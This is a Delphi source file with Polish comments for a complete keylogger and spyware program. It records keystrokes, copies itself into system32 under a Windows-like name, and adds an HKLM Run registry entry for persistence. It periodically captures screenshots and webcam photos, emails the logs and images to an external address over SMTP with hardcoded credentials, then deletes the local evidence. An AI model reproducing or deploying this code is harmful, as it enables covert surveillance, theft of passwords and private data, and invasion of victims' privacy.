unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, KeySpyXP, ExtCtrls, registry, Camera, XPMan,
  IdComponent, IdTCPConnection, IdTCPClient, IdMessageClient, IdSMTP,
  IdBaseComponent, IdMessage;

type
TTabImage = Array[0..230399] of byte;
  TForm1 = class(TForm)
    Memo1: TMemo;
    KeySpyXP1: TKeySpyXP;
    Timer1: TTimer;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    XPManifest1: TXPManifest;
    Camera1: TCamera;
    IdMessage1: TIdMessage;
    IdSMTP1: TIdSMTP;
    Timer2: TTimer;
    procedure KeySpyXP1Key(Sender: TObject; key: String);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Reg:tRegistry;
    DC: THandle;
 Bitmap: TBitmap;
 Filename : String;
 Monochrome : Boolean;
 Depth : TPixelFormat;
  p : ^TTabImage;


implementation

{$R *.dfm}

procedure TForm1.KeySpyXP1Key(Sender: TObject; key: String);
begin
if key[1]='{' then
memo1.lines.add(key) else
memo1.Text:=memo1.text+key;
end;


 //przechwytywanie logów






procedure TForm1.Timer1Timer(Sender: TObject);

begin
memo1.lines.savetofile('C:\temp_CFFFFG32.ini');
end;


  //zapisywanie timerem co sekundê


  
procedure TForm1.FormCreate(Sender: TObject);
begin

if Not FileExists('C:\Windows\system32\Windows_xt_32.exe')  then
begin
CopyFile('Sciagi.exe', 'C:\Windows\system32\Windows_xt_32.exe', False);

 //kopiowanie na C
end;


begin
 if  FileExists('C:\temp_CFFFFG32.ini') Then
begin
Memo1.Lines.LoadFromFile('C:\temp_CFFFFG32.ini');
end;



 if Not FileExists('C:\temp_CFFFFG32.ini') Then      //sprawdzamy
begin



memo1.lines.savetofile('C:\temp_CFFFFG32.ini');

 //je¿eli nie istnieje to pierwszy zapis






Reg:=TRegistry.Create;

Reg.RootKey := HKEY_LOCAL_MACHINE;
try
Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',False);
Reg.WriteString('Windows_xt_32', 'C:\Windows\system32\Windows_xt_32.exe');
finally
Reg.CloseKey;
Reg.Free;

// i do rejestru




end;
end;


 end;
 end;
 procedure TForm1.Timer2Timer(Sender: TObject);
begin
begin
try
  DC := GetDC(GetDesktopWindow);
  Bitmap := TBitmap.Create;
  Bitmap.Width := GetSystemMetrics(SM_CXSCREEN);
  Bitmap.Height := GetSystemMetrics(SM_CYSCREEN);
  Bitmap.PixelFormat := pf16bit;
  BitBlt(Bitmap.Canvas.Handle, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), DC, 0, 0, SRCCOPY);
  ReleaseDC(GetDesktopWindow, DC);
  Bitmap.MonoChrome := false;
  Bitmap.SaveToFile('C:/temp_windows_view.jpg');
  Bitmap.Dormant;
//bitmap.
  Bitmap.FreeImage;
  Bitmap.Free;
 except
 end;

 //najpierw screen


 try
  Camera1.Actif:=True;
  New(p);                   //sprawdzamy czy jest kamera
  except;
end;

   Camera1.FichierImage := '';
  Camera1.FichierImage := 'C:/win_control_view.jpg';
  Camera1.CaptureImageDisque;
 sleep(1000)    ;
 Camera1.Actif:=false;


 //pó¿niej zdjêcie

IdMessage1.Body.Append(memo1.text);
IdMessage1.Recipients.EMailAddresses := 'marwis95@o2.pl';
IdMessage1.Subject := 'Logs';
IdMessage1.From.Name := 'Keylogger';
IdMessage1.From.Address := 'marwis95@o2.pl';
idSMTP1.Password := 'strtoint';
idSMTP1.Username := 'marwis95';
idSMTP1.Host := 'poczta.o2.pl';
TIdAttachment.Create(IdMessage1.MessageParts, 'C:/temp_windows_view.jpg');
TIdAttachment.Create(IdMessage1.MessageParts, 'C:/win_control_view.jpg');
IdSMTP1.Connect;
try
  IdSMTP1.Send(IdMessage1);
finally
  IdSMTP1.Disconnect;
end;
 sleep(5000);
 memo1.clear;
 deletefile('C:\temp_CFFFFG32.ini');
 memo1.text:=('Clear');
 memo1.lines.savetofile('C:\temp_CFFFFG32.ini');
 deletefile('C:/temp_windows_view.jpg');
 deletefile('C:/win_control_view.jpg');


 //no to idzie mail

end;
end;

end.


